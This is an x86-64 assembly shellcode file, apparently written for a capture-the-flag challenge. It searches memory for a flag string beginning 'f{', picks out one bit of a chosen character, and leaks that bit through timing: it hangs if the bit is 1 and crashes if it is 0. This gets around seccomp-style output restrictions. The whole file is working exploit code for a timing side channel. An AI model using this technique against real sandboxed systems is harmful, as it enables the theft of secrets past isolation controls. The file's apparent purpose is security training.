.global _start

_start:
.intel_syntax noprefix

xor rbx, rbx

# Despite this terrible naming, I am not actually breaking seccomp here lmao

# NOTE: This is meant to be run by the supplied automated script.

# Bruteforce flag location  (Search for pattern 'f{')
# Can scan around a few thousands bytes before it finds the flag area

mov rsi, r8

addr_find:
sub rsi, 1

mov rdx, rsi
sub rdx, 1

mov bl, byte ptr [rdx]
cmp bl, 102
jnz addr_find

mov bl, byte ptr [rsi]
cmp bl, 123
jnz addr_find


# Get index of buffer
add rsi, [index]

xor rbx, rbx
mov bl, byte ptr [rsi]

#Get bit of character
shr bl, [shift]
and bl, 1

# Timing Attack
# If bit is 1, run an infinite loop. else happily segfault

loop:

cmp bl, 1
jz loop
